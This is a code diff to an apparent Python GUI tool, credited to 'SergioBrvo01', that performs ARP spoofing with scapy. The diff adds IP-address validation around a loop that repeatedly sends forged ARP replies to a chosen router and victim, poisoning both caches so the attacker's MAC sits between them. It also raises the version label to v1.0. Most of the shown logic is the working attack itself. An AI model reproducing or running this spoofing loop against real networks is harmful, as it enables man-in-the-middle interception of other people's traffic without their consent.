@@ -3,25 +3,29 @@ import customtkinter, subprocess, sys, re, time, os, threading
 import scapy.all as scapy
 from CTkMessagebox import CTkMessagebox
 
-
-#def values_validate(router, victim):
+# def values_validate(router, victim):
 
 def spoofing_switch_changed(state, routerip, victimip, timespoof, mac):
     router = routerip.get()
     victim = victimip.get()
     timespoof = int(timespoof.get())
+    ip_pattern = re.compile(r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
 
-    while state.get() == 1:
-        try:
-            state.configure(text="Spoofing ON 🟢")
-            arp_packet = scapy.ARP(op=2, psrc=router, pdst=victim, hwsrc=mac)
-            scapy.send(arp_packet, verbose=False)
-            arp_packet = scapy.ARP(op=2, psrc=victim, pdst=router, hwsrc=mac)
-            scapy.send(arp_packet, verbose=False)
-            time.sleep(timespoof)
-        except:
-            break
-    state.configure(text="Spoofing OFF 🔴")
+    if ip_pattern.match(router) and ip_pattern.match(victim):
+        while state.get() == 1:
+            try:
+                state.configure(text="Spoofing ON 🟢")
+                arp_packet = scapy.ARP(op=2, psrc=router, pdst=victim, hwsrc=mac)
+                scapy.send(arp_packet, verbose=False)
+                arp_packet = scapy.ARP(op=2, psrc=victim, pdst=router, hwsrc=mac)
+                scapy.send(arp_packet, verbose=False)
+                time.sleep(timespoof)
+            except:
+                break
+        state.configure(text="Spoofing OFF 🔴")
+    else:
+        state.deselect()
+        state.configure(text="Spoofing OFF 🔴\n INVALID IPs Values")
 
 def main():
     windows = customtkinter.CTk()
@@ -71,7 +75,7 @@ def main():
                                     command=lambda: threading.Thread(target=spoofing_switch_changed, args=(state, routerip_value, victimip_value, timespoof_value, mac), daemon=True).start())
     state.grid(row=5, column=1, columnspan=2, padx=20, pady=40)
 
-    credit = customtkinter.CTkLabel(windows, text="v0.5 | by SergioBrvo01", font=customtkinter.CTkFont(size=10), fg_color=("gray85", "gray25"), corner_radius=5, padx=10)
+    credit = customtkinter.CTkLabel(windows, text="v1.0 | by SergioBrvo01", font=customtkinter.CTkFont(size=10), fg_color=("gray85", "gray25"), corner_radius=5, padx=10)
     credit.grid(row=6, column=1, columnspan=2, padx=20, pady=40)
 
     windows.deiconify()
